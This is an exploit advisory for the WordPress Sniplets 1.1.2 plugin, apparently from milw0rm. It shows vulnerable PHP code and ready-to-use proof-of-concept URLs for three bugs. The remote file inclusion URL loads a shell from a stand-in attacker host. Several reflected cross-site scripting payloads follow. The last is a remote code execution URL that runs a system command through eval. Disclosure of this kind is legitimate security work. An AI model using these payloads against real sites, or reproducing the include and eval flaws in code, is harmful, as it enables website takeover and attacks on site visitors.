@@ -1,0 +1,51 @@
+########################
+Wordpress Plugin Sniplets 1.1.2 Multiple Vulnerabilities by NBBN
+########################
+1) Remote File Inclusion
+
+File: /modules/syntax_highlight.php
+Register Globals: ON
+Vuln code:
+<?php
+
+/* Name: Syntax Highlight */
+include_once ("$libpath/geshi/geshi.php");
+
+Poc:
+http://victim.tld/wordpress/wp-content/plugins/sniplets/modules/syntax_highlight.php?libpath=http://attacker.tld/shell.txt?
+
+
+
+
+2) Cross-Site Scripting
+
+Register Globals: ON
+http://victim.tld/wordpress/wp-content/plugins/sniplets/view/sniplets/warning.php?text=%3Cscript%3Ealert(%22XSS%22)%3C/script%3E
+http://victim.tld/wordpress/wp-content/plugins/sniplets/view/sniplets/notice.php?text=%3Cscript%3Ealert(%22XSS%22)%3C/script%3E
+http://victim.tld/wordpress/wp-content/plugins/sniplets/view/sniplets/inset.php?text=%3Cscript%3Ealert(%22XSS%22)%3C/script%3E
+http://victim.tld/wordpress/wp-content/plugins/sniplets/view/admin/submenu.php?url=%22%3E%3Cscript%3Ealert(%22XSS%22)%3C/script%3E
+http://victim.tld/wordpress/wp-content/plugins/sniplets/modules/execute.php?text=%3Cli%3E
+
+Register Globals: Off
+
+Vuln Line:(3) <input type="hidden" name="page" value="<?php echo 
+$_GET['page'] ?>"/>
+http://victim.tld/wordpress/wp-content/plugins/sniplets/view/admin/pager.php?page=%22%3E%3Cscript%3Ealert(%22XSS%22)%3C/script%3E
+
+
+3) Remote Code Execution
+
+Register Globals: ON
+Code: 
+<?php
+/* Name: Execute as PHP */
+if (substr ($text, 0, 4) == '<?php')
+	$text = '?>'.$text;
+
+eval ('?>'.$text);
+?>
+
+Poc: 
+http://victim.tld/wordpress/wp-content/plugins/sniplets/modules/execute.php?text=%3C?php%20system(%22ls%22);
+
+# milw0rm.com [2008-02-26]
